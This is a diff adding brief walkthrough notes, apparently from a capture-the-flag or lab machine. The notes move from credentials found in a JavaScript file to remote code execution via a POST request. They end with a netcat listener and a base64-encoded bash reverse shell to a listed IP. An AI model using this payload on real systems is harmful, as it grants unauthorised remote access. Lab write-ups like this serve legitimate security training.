@@ -1,0 +1,13 @@
+1. Since http port is open -> Inspect the page
+2. We found some credentials by inspecting the .js file
+    2.1 By intercepting the connection with burpsuite, we also get the same credentials in base64
+3. Once logged in the web, we can download some images. If we inspect the download process with burpsuite we detect a POST request
+4. Trying a RCE with the POST request -> Successfull
+5. Opening a Reverse Shell with NetCat:
+    5.1 Listen to a connection in an arbitrary port:
+
+      netcat -lvp 1111
+
+    5.2 Inject a reverse shell using the POST method: (we enconding it since we the normal execution didnt worked due to / character)
+
+      echo 'L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE2LjUzLzExMTEgMD4mMQo=' | base64 -d | bash
